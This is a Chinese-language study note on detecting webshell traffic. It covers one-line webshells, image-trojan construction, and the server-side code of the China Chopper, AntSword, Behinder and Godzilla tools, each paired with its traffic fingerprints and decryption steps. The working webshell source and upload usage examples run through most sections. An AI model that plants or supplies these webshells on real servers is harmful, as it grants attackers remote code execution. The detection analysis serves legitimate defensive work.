# Webshell流量分析

常见的一句话木马：

```
asp一句话 <%eval request("pass")%>
aspx一句话 <%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
php一句话 <?php @eval($_POST["pass"]);?>
```

## 什么是Webshell

- Webshell看起来和普通的服务端脚本一样，看起来就像普通的代码。
- Webshell对本地资源具备一定的操作能力，其操作本地资源的范围取决于解析器的权限。

```php
# webshell: 1.php
<?php echo system($_GET["cmd"]);?>
# 利用方式 
http://ip:port/hackable/uploads/1.php?cmd=ls
```

```php
# webshell: 2.php
<?php eval($_GET["cmd"]);?>
# 利用方式
http://ip:port/hackable/uploads/2.php?cmd=phpinfo();
```

```php
#  webshell: 3.php
<?php include "shell.jpg";?>
# 利用方式
# 上传shell.jpg到同一目录，其中包含代码<?php phpinfo();?>
# 文件也可以是shell.jsp、shell.txt
http://ip:port/hackable/uploads/3.php
```

## Webshell恶意函数

```
fwrite：写入文件（可安全用于二进制文件）。
eval：把字符串作为PHP代码执行。
exec：执行一个外部程序。
system：执行外部程序，并且显示输出。
stripslashes：反引用一个引用字符串。
inflate：inflate方法的主要作用就是将xml转换成一个View对象，用于动态的创建布局。
gzinflate：gzinflate()，gzdeflate()是压缩与解压缩算法。
passthru：执行外部程序并且显示原始输出。
move_uploaded_file：将上传的文件移动到新位置。
phpinfo：输出关于 PHP 配置的信息。
```

## 图片马制作方式

copy命令：

```
CMD命令：copy 1.jpg/b+1.php/a 2.jpg
```

PS软件：

```
PS打开图片，在文件—>文件简介里插入需要的木马代码，最后：文件—>保存【保存：覆盖原文件，也可以另存为其他格式】。
```

edjpg软件：

```
将图片直接拖到edjpg.exe上，在弹出窗口内输入一句话木马即可。
```

十六进制编辑器：

```
用010 Editor或winhex等十六进制编辑器打开图片，将一句话木马插入到右边最底层或最上层后保存。
```

## Webshell流量分析

### CKnife 菜刀

Webshell代码：

```php
# npc.php
<?php eval($_POST["npc"]);?>
```

流量特征：

- 明文传输。
- npc是php一句话木马的password。

![img](./images/202211091032518.png)

### Antsword 蚁剑

Webshell代码：

```jsp
# 4.jsp

<%!
class U extends ClassLoader{
  U(ClassLoader c){
    super(c);
  }
  public Class g(byte []b){
    return super.defineClass(b,0,b.length);
  }
}
%>
<%
String cls=request.getParameter("ant");
if(cls!=null){
  new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext);
}
%>
```

流量特征：

- 明文传输。
- ant是jsp一句话木马的password。

![img](./images/202211091034381.png)

### Behinder 冰蝎2

Webshell代码：

```php
# behinder.php，密码pass

<?php
@error_reporting(0);
session_start();
if (isset($_GET['pass']))
{
    $key=substr(md5(uniqid(rand())),16);
    $_SESSION['k']=$key;
    print $key;
}
else
{
    $key=$_SESSION['k'];
  $post=file_get_contents("php://input");
  if(!extension_loaded('openssl'))
  {
    $t="base64_"."decode";
    $post=$t($post."");
    
    for($i=0;$i<strlen($post);$i++) {
           $post[$i] = $post[$i]^$key[$i+1&15]; 
          }
  }
  else
  {
    $post=openssl_decrypt($post, "AES128", $key);
  }
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
  class C{public function __construct($p) {eval($p."");}}
  @new C($params);
}
?>
```

流量特征：

- 密文传输。
- **Response响应包的Content Length为16。**

#### 加解密

AES加密，参考工具：https://oktools.net/aes

- Response响应包的content length为16的字符串为key，例如`93edbafac50eb64c`。
- 模式：CBC，填充：Pkcs7。

![img](./images/202211091042813.png)

流量AES加解密示例：

```
# 密钥
key = 93edbafac50eb64c

# 密文
cipher = pu+VEA885HAovMSbbH5wj3cXwQkpnSRYpZy8fAWrRA3ETLuyZqRQSm6koxDp1mKeTYLUlMk59hK6lOAbj2Hh/vxXzVyn/4uPlKV7WeMOeRGLhBQMou01R+TJLP7NTtVn

# 通过在线工具解密
# 明文
{"status":"c3VjY2Vzcw==","msg":"YmMzYjNhNzktY2Q4NC00ZGUwLWJjYzUtMjQ0NmY4NzUxNjE1"}
# 再通过base64解密
{"status":"c3VjY2Vzcw==","msg":"bc3b3a79-cd84-4de0-bcc5-2446f8751615"}
```

### Behinder 冰蝎3

Webshell代码：

```php
# behinder3.php，密码rebeyond

<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
```

流量特征：

- 冰蝎最小的流量包，**请求头的content length都大于5000**。
- 采用POST方式进行连接。

#### 加解密

- 数据包中都是base64编码，WAF无法防御。

![img](./images/202211091045328.png)

### Godzilla 哥斯拉

Webshell代码：

- 生成php的webshell代码：管理→生成

```
密码：pass				
密钥：key 				# md5：3c6e0b8a9c15224a8228b9a98ca1531d
有效载荷：PhpDynamicPayload
加密器：PHP_XOR_BASE64
```

```php
# gozilla.php

<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='pass';
$payloadName='payload';
$key='3c6e0b8a9c15224a';   # key的md5前16位
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```

- 指纹`6c37ac826a2a04bc`的生成过程：

```
密码：pass				
密钥：key 				# md5：3c6e0b8a9c15224a8228b9a98ca1531d

# key的md5取前16位，即3c6e0b8a9c15224a
$key='3c6e0b8a9c15224a';   # key的md5前16位

# pass和key拼接取后16位，即6c37ac826a2a04bc
echo substr(md5($pass.$key),16);
```

流量特征：

- 每一个响应流量最后都带有`6c37ac826a2a04bc`。

![img](./images/202211091046532.png)